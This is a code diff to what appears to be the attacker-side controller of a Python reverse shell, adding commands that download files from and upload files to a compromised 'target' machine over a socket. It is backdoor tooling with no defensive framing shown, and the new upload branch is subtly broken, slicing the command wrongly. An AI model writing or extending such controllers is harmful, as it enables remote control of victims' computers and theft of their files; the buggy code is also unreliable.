@@ -18,6 +18,25 @@ def reliable_recv():
             continue
 
 
+def download_file(filename):
+    f = open(filename, 'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        try:
+            f.write(chunk)
+            chunk = target.recv(1024)
+        except socket.timeout:
+            break
+    target.settimeout(None)
+    f.close()
+
+
+def upload_file(filename):
+    f = open(filename, 'rb')
+    target.send(f.read())
+
+
 def target_comunication():
     while True:
         command = input(f'* Shell~%{ip}: ')
@@ -28,6 +47,10 @@ def target_comunication():
             pass
         elif command == 'clear':
             os.system(command)
+        elif command[:9] == 'download ':
+            download_file(command[9:])
+        elif command[:7] == 'upload ':
+            upload_file(command[:7])
         else:
             result = reliable_recv()
             print(result)
